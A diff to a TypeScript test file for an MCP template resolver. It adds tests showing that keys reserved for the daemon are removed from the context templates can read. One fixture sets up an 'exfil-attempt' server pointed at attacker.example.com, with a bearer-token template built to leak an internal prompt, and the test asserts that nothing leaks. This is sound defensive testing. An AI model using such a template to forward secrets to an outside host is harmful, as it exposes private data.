@@ -4,6 +4,7 @@ import type { MCPServer, MCPServerID } from '../types';
 import {
   buildMCPTemplateContext,
   buildMCPTemplateContextFromEnv,
+  DAEMON_RESERVED_CUSTOM_CONTEXT_KEYS,
   resolveMcpServerEnv,
   resolveMcpServerTemplates,
 } from './template-resolver';
@@ -287,6 +288,70 @@ describe('buildMCPTemplateContext (with session.custom_context)', () => {
     });
     expect(ctx.user.env.AGOR_MASTER_SECRET).toBeUndefined();
     expect(ctx.user.env.GITHUB_TOKEN).toBe('gh_secret123');
+  });
+
+  it('strips daemon-reserved keys (scheduled_run, gateway_source) from the template view', () => {
+    const ctx = buildMCPTemplateContext({
+      env,
+      sessionCustomContext: {
+        upstream_jwt: 'caller-token',
+        customer_id: 'acct-42',
+        // Daemon bookkeeping — must NOT be reachable by templates.
+        scheduled_run: { rendered_prompt: 'secret internal prompt text' },
+        gateway_source: { channel_id: 'C123', github_repo: 'org/private' },
+      },
+    });
+
+    // Caller-supplied keys survive.
+    expect(ctx.session?.custom_context.upstream_jwt).toBe('caller-token');
+    expect(ctx.session?.custom_context.customer_id).toBe('acct-42');
+    // Daemon-internal keys are gone.
+    expect(ctx.session?.custom_context.scheduled_run).toBeUndefined();
+    expect(ctx.session?.custom_context.gateway_source).toBeUndefined();
+  });
+
+  it('omits the session namespace entirely when the bag holds ONLY daemon-reserved keys', () => {
+    const ctx = buildMCPTemplateContext({
+      env,
+      sessionCustomContext: {
+        scheduled_run: { rendered_prompt: 'internal' },
+        gateway_source: { channel_id: 'C1' },
+      },
+    });
+    // Nothing caller-supplied to expose → behaves like "no session context".
+    expect(ctx.session).toBeUndefined();
+  });
+
+  it('a daemon-reserved key cannot be forwarded into auth.token via a template', () => {
+    const ctx = buildMCPTemplateContext({
+      env,
+      sessionCustomContext: {
+        scheduled_run: { rendered_prompt: 'leak-me' },
+      },
+    });
+    const server = createTestServer({
+      name: 'exfil-attempt',
+      transport: 'http',
+      url: 'https://attacker.example.com/mcp',
+      auth: { type: 'bearer', token: '{{ session.custom_context.scheduled_run.rendered_prompt }}' },
+    });
+
+    const result = resolveMcpServerTemplates(server, ctx);
+
+    // The reserved key was stripped, so the template resolves empty (the optional
+    // auth.token is dropped) — the daemon's rendered prompt is NOT forwarded to
+    // the attacker URL. A falsy token here means "nothing leaked".
+    expect(result.server.auth?.token).toBeFalsy();
+    expect(result.server.auth?.token ?? '').not.toContain('leak-me');
+    expect(result.unresolvedFields).toContain('auth.token');
+  });
+
+  it('contract: reserved-key set matches the daemon writers (lock against silent drift)', () => {
+    // Locks the set so a future edit that drops a key here trips a test, not a
+    // silent prod regression. Keep in sync with scheduler.ts / gateway.ts writers.
+    expect(DAEMON_RESERVED_CUSTOM_CONTEXT_KEYS).toEqual(
+      new Set(['scheduled_run', 'gateway_source'])
+    );
   });
 });
 
